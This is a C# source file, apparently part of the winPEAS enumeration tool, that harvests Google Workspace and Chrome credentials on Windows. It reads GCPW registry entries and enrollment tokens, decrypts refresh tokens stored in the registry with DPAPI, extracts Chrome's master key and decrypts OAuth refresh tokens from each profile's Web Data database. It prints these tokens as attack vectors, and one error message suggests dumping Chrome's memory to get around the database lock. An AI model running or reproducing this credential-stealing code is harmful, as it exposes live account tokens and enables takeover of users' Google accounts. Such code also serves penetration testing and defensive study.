using System;
using System.Collections.Generic;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using winPEAS.Helpers;
using System.Data.SQLite;
using Org.BouncyCastle.Crypto;
using Org.BouncyCastle.Crypto.Parameters;
using Org.BouncyCastle.Crypto.Modes;
using System.Linq;
using Microsoft.Win32;
using System.Web.Script.Serialization;


namespace winPEAS.Info.CloudInfo
{
    internal class GCPJoinedInfo : CloudInfoBase
    {
        public override string Name => "Google Workspace Joined";

        public override bool IsCloud => CheckIfGCPWUsers();

        private Dictionary<string, List<EndpointData>> _endpointData = null;

        private List<EndpointData> GetWorkspaceRegValues()
        {
            Dictionary<string, string> workspaceRegValues = new Dictionary<string, string>();
            workspaceRegValues.Add("Domains Allowed", Helpers.Registry.RegistryHelper.GetRegValue("HKLM", @"SOFTWARE\Google\GCPW", @"domains_allowed_to_login"));

            // Get all values from all subregistries of Users
            string[] users = Helpers.Registry.RegistryHelper.GetRegSubkeys("HKLM", @"SOFTWARE\Google\GCPW\Users");
            for (int i = 0; i < users.Length; i++)
            {
                workspaceRegValues.Add($"HKLM Workspace user{i}", users[i]);
                workspaceRegValues.Add($"    Email{i}", Helpers.Registry.RegistryHelper.GetRegValue("HKLM", @"SOFTWARE\Google\GCPW\Users\" + users[i], @"email"));
                workspaceRegValues.Add($"    Domain{i}", Helpers.Registry.RegistryHelper.GetRegValue("HKLM", @"SOFTWARE\Google\GCPW\Users\" + users[i], @"domain"));
                workspaceRegValues.Add($"    Id{i}", Helpers.Registry.RegistryHelper.GetRegValue("HKLM", @"SOFTWARE\Google\GCPW\Users\" + users[i], @"id"));
                workspaceRegValues.Add($"    Pic{i}", Helpers.Registry.RegistryHelper.GetRegValue("HKLM", @"SOFTWARE\Google\GCPW\Users\" + users[i], @"pic"));
                workspaceRegValues.Add($"    User Name{i}", Helpers.Registry.RegistryHelper.GetRegValue("HKLM", @"SOFTWARE\Google\GCPW\Users\" + users[i], @"user_name"));
                workspaceRegValues.Add($"    Last Policy Refresh Time{i}", Helpers.Registry.RegistryHelper.GetRegValue("HKLM", @"SOFTWARE\Google\GCPW\Users\" + users[i], @"last_policy_refresh_time"));
                workspaceRegValues.Add($"    Last Token Valid Millis{i}", Helpers.Registry.RegistryHelper.GetRegValue("HKLM", @"SOFTWARE\Google\GCPW\Users\" + users[i], @"last_token_valid_millis"));
                workspaceRegValues.Add($"    Token Handle{i}", Helpers.Registry.RegistryHelper.GetRegValue("HKLM", @"SOFTWARE\Google\GCPW\Users\" + users[i], @"th"));
            }

            string[] users3 = Helpers.Registry.RegistryHelper.GetRegSubkeys("HCKU", @"SOFTWARE\Google\Accounts");
            if (users3.Length > 0)
            {
                workspaceRegValues.Add($"HKU Workspace user", System.Security.Principal.WindowsIdentity.GetCurrent().Name);
            }
                
            for (int i = 0; i < users3.Length; i++)
            {
                workspaceRegValues.Add($"    HKU-Email{i}", Helpers.Registry.RegistryHelper.GetRegValue("HCKU", @"SOFTWARE\Google\Accounts\"+ users3[i], @"email"));
                string refreshTokenPath = @"HKEY_CURRENT_USER\SOFTWARE\Google\Accounts\" + users3[i];
                byte[] refreshTokenB = (byte[])Registry.GetValue(refreshTokenPath, @"refresh_token", null);
                if (refreshTokenB.Length > 0)
                {
                    string refreshTokenDecrypted = DecryptRegRefreshToken(refreshTokenPath);
                    if (refreshTokenDecrypted.Length > 0)
                        workspaceRegValues.Add($"    HKU-Refresh Token{i}", refreshTokenDecrypted);
                }
            }

            // Get cloud management tokens
            workspaceRegValues.Add("Chrome Enrollment Token", Helpers.Registry.RegistryHelper.GetRegValue("HKLM", @"SOFTWARE\Policies\Google\Chrome", @"CloudManagementEnrollmentToken"));
            workspaceRegValues.Add("Workspace Enrollment Token", Helpers.Registry.RegistryHelper.GetRegValue("HKLM", @"SOFTWARE\Policies\Google\CloudManagement", @"EnrollmentToken"));

            // Format the info in expected CloudInfo format
            List<EndpointData> _endpointDataList = new List<EndpointData>();

            foreach (var kvp in workspaceRegValues)
            {
                _endpointDataList.Add(new EndpointData()
                {
                    EndpointName = kvp.Key,
                    Data = kvp.Value?.Trim(),
                    IsAttackVector = false
                });
            }

            return _endpointDataList;
        }

        static string DecryptRegRefreshToken(string registryPath)
        {
            // Define the registry path where the refresh token is stored
            string valueName = "refresh_token";

            // Retrieve the encrypted refresh token from the registry
            byte[] encryptedRefreshToken = (byte[])Registry.GetValue(registryPath, valueName, null);

            if (encryptedRefreshToken == null || encryptedRefreshToken.Length == 0)
            {
                Console.WriteLine("No encrypted refresh token found in the registry.");
                return "";
            }

            try
            {
                // Decrypt the refresh token using CryptUnprotectData
                byte[] decryptedTokenBytes = ProtectedData.Unprotect(
                    encryptedRefreshToken,
                    null, // No additional entropy
                    DataProtectionScope.CurrentUser // Use the current user's scope
                );

                // Convert the decrypted token to an ASCII string
                string refreshToken = Encoding.ASCII.GetString(decryptedTokenBytes);
                return refreshToken;
            }
            catch (Exception ex)
            {
                Console.WriteLine("Error decrypting the refresh token: " + ex.Message);
            }
            return "";
        }

        public static bool CheckIfGCPWUsers()
        {
            string[] check = Helpers.Registry.RegistryHelper.GetRegSubkeys("HKLM", @"SOFTWARE\Google\GCPW\Users");
            return check != null && check.Length > 0; 
        }

        public override Dictionary<string, List<EndpointData>> EndpointDataList()
        {
            if (_endpointData == null)
            {
                _endpointData = new Dictionary<string, List<EndpointData>>();

                try
                {
                    if (IsAvailable)
                    {
                        _endpointData.Add("Local Info", GetWorkspaceRegValues());
                        _endpointData.Add("Local Refresh Tokens", GetRefreshToken());
                        _endpointData.Add("Local Config", GetLocalFileCong());
                    }
                    else
                    {
                        _endpointData.Add("General Info", new List<EndpointData>()
                        {
                            new EndpointData()
                            {
                                EndpointName = "",
                                Data = null,
                                IsAttackVector = false
                            }
                        });
                    }
                }
                catch (Exception ex)
                {
                    Beaprint.PrintException(ex.Message);
                }
            }

            return _endpointData;
        }

        static List<EndpointData> GetRefreshToken()
        {
            string chromeLocalStatePath = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\Google\Chrome\User Data\Local State";
            string masterKey = GetMasterKey(chromeLocalStatePath);

            string[] chromeProfilePaths = Directory.GetDirectories(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\Google\Chrome\User Data\", "Defaul*");
            string[] chromeExtraProfilePaths = Directory.GetDirectories(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\Google\Chrome\User Data\", "Profile*");
            string[] chromeAllProfilePaths = chromeProfilePaths.Concat(chromeExtraProfilePaths).ToArray();
            string[] refreshTokens = new string[0];

            foreach (string profilePath in chromeAllProfilePaths)
            {
                string webDataPath = Path.Combine(profilePath, "Web Data");

                if (File.Exists(webDataPath))
                {
                    refreshTokens = ExtractRefreshTokens(webDataPath, masterKey);
                }
            }

            List<EndpointData> _endpointDataList = new List<EndpointData>();

            for (int i = 0; i < refreshTokens.Length; i++)
            {
                _endpointDataList.Add(new EndpointData()
                {
                    EndpointName = $"Token{i}" ,
                    Data = refreshTokens[i].Trim(),
                    IsAttackVector = true
                });
            }

            return _endpointDataList;
        }

        private static string GetMasterKey(string localStatePath)
        {
            string localStateJson = File.ReadAllText(localStatePath);
            JavaScriptSerializer serializer = new JavaScriptSerializer();
            dynamic json = serializer.Deserialize<dynamic>(localStateJson);
            string encryptedKeyBase64 = json["os_crypt"]["encrypted_key"];

            byte[] encryptedKeyWithPrefix = Convert.FromBase64String(encryptedKeyBase64);
            byte[] encryptedKey = new byte[encryptedKeyWithPrefix.Length - 5];
            Array.Copy(encryptedKeyWithPrefix, 5, encryptedKey, 0, encryptedKeyWithPrefix.Length - 5);

            byte[] masterKey = ProtectedData.Unprotect(encryptedKey, null, DataProtectionScope.CurrentUser);
            return Convert.ToBase64String(masterKey);
        }

        private static string[] ExtractRefreshTokens(string webDataPath, string masterKey)
        {
            List<string> refreshTokens = new List<string>();
            try
            {
                using (SQLiteConnection connection = new SQLiteConnection($"Data Source={webDataPath};Version=3;"))
                {
                    connection.Open();
                    string query = "SELECT service, encrypted_token FROM token_service;";

                    using (SQLiteCommand command = new SQLiteCommand(query, connection))
                    using (SQLiteDataReader reader = command.ExecuteReader())
                    {
                        while (reader.Read())
                        {
                            string service = reader["service"].ToString();

                            // Check if encrypted_token is null or empty
                            if (reader["encrypted_token"] == DBNull.Value)
                            {
                                Console.WriteLine("The encrypted_token is NULL in the database.");
                                continue;
                            }
                            byte[] encryptedToken = (byte[])reader["encrypted_token"];

                            string decryptedToken = DecryptWithAESGCM(encryptedToken, Convert.FromBase64String(masterKey));
                            refreshTokens.Add(decryptedToken);
                        }
                    }
                }
                return refreshTokens.ToArray();
            }
            catch (Exception ex)
            {
                Beaprint.PrintException("Error extracting refresh tokens (If Chrome is running the DB is probably locked but you could dump Chrome's procs and search it there or go around this lock): " + ex.Message);
                return refreshTokens.ToArray();
            }
        }
        public static string DecryptWithAESGCM(byte[] ciphertext, byte[] key)
        {
            // Constants
            int nonceLength = 12; // GCM standard nonce length
            int macLength = 16;   // GCM authentication mac length
            string versionPrefix = "v10"; // Matching kEncryptionVersionPrefix

            // Convert prefix to byte array
            byte[] versionPrefixBytes = Encoding.ASCII.GetBytes(versionPrefix);

            // Check the prefix
            if (ciphertext.Length < versionPrefixBytes.Length ||
                !IsPrefixMatch(ciphertext, versionPrefixBytes))
            {
                throw new ArgumentException("Invalid encryption version prefix.");
            }

            // Extract the nonce from the ciphertext (after the prefix)
            byte[] nonce = new byte[nonceLength];
            Array.Copy(ciphertext, versionPrefixBytes.Length, nonce, 0, nonceLength);

            // Extract the actual encrypted data (after the prefix and nonce)
            int encryptedDataStartIndex = versionPrefixBytes.Length + nonceLength;
            byte[] encryptedData = new byte[ciphertext.Length - encryptedDataStartIndex];
            Array.Copy(ciphertext, encryptedDataStartIndex, encryptedData, 0, encryptedData.Length);

            // Split the mac and actual ciphertext
            byte[] mac = new byte[macLength];
            Array.Copy(encryptedData, encryptedData.Length - macLength, mac, 0, macLength);

            byte[] actualCiphertext = new byte[encryptedData.Length - macLength];
            Array.Copy(encryptedData, 0, actualCiphertext, 0, actualCiphertext.Length);

            // Perform the decryption using Bouncy Castle
            try
            {
                GcmBlockCipher gcm = new GcmBlockCipher(new Org.BouncyCastle.Crypto.Engines.AesEngine());
                AeadParameters parameters = new AeadParameters(new KeyParameter(key), macLength * 8, nonce);
                gcm.Init(true, parameters);

                byte[] plaintext = new byte[gcm.GetOutputSize(actualCiphertext.Length)];
                int len = gcm.ProcessBytes(actualCiphertext, 0, actualCiphertext.Length, plaintext, 0);
                int len2 = gcm.DoFinal(plaintext, len);

                string plaintextString = Encoding.ASCII.GetString(plaintext, 0, len+len2-mac.Length);
                

                return plaintextString;
            }
            catch (InvalidCipherTextException ex)
            {
                throw new CryptographicException("Decryption failed due to MAC mismatch", ex);
            }
        }

        private static bool IsPrefixMatch(byte[] ciphertext, byte[] versionPrefixBytes)
        {
            for (int i = 0; i < versionPrefixBytes.Length; i++)
            {
                if (ciphertext[i] != versionPrefixBytes[i])
                    return false;
            }
            return true;
        }

        private static byte[] PerformCryptography(byte[] data, ICryptoTransform cryptoTransform)
        {
            using (MemoryStream ms = new MemoryStream())
            {
                using (CryptoStream cryptoStream = new CryptoStream(ms, cryptoTransform, CryptoStreamMode.Write))
                {
                    cryptoStream.Write(data, 0, data.Length);
                    cryptoStream.FlushFinalBlock();
                    return ms.ToArray();
                }
            }
        }

        public override bool TestConnection()
        {
            return true;
        }


        static List<EndpointData> GetLocalFileCong()
        {
            string baseDirectory = @"C:\ProgramData\Google\Credential Provider\Policies";
            List<EndpointData> _endpointDataList = new List<EndpointData>();

            if (Directory.Exists(baseDirectory))
            {
                // Get all directories inside the base directory
                string[] directories = Directory.GetDirectories(baseDirectory);

                for (int i = 0; i < directories.Length; i++)
                {
                    string directory = directories[i];
                    string directory_name = Path.GetFileName(directory);
                    string filePath = Path.Combine(directory, "PolicyFetchResponse");

                    if (File.Exists(filePath))
                    {
                        try
                        {
                            // Read the content of the PolicyFetchResponse file
                            string jsonContent = File.ReadAllText(filePath);

                            JavaScriptSerializer serializer = new JavaScriptSerializer();
                            dynamic json = serializer.Deserialize<dynamic>(jsonContent);
                            bool enableDmEnrollment = json["policies"]["enableDmEnrollment"];
                            bool enableGcpwAutoUpdate = json["policies"]["enableGcpwAutoUpdate"];
                            bool enableMultiUserLogin = json["policies"]["enableMultiUserLogin"];
                            int validityPeriodDays = json["policies"]["validityPeriodDays"];

                            string uniq_key = directories.Length > 1 ? directory_name : "";
                            _endpointDataList.Add(new EndpointData()
                            {
                                EndpointName = $"{uniq_key}enableDmEnrollment",
                                Data = json["policies"]["enableDmEnrollment"].ToString(),
                                IsAttackVector = false
                            });

                            _endpointDataList.Add(new EndpointData()
                            {
                                EndpointName = $"{uniq_key}enableGcpwAutoUpdate",
                                Data = json["policies"]["enableGcpwAutoUpdate"].ToString(),
                                IsAttackVector = false
                            });

                            _endpointDataList.Add(new EndpointData()
                            {
                                EndpointName = $"{uniq_key}enableMultiUserLogin",
                                Data = json["policies"]["enableMultiUserLogin"].ToString(),
                                IsAttackVector = false
                            });

                            _endpointDataList.Add(new EndpointData()
                            {
                                EndpointName = $"{uniq_key}validityPeriodDays",
                                Data = json["policies"]["validityPeriodDays"].ToString(),
                                IsAttackVector = false
                            });
                        }
                        catch (Exception ex)
                        {
                            Console.WriteLine($"Error reading file in {directory}: {ex.Message}");
                        }
                    }
                    else
                    {
                        Console.WriteLine($"File not found in directory: {directory}");
                    }
                }
            }
            else
            {
                Console.WriteLine($"Directory '{baseDirectory}' does not exist.");
            }

            return _endpointDataList;
        }
    }
}
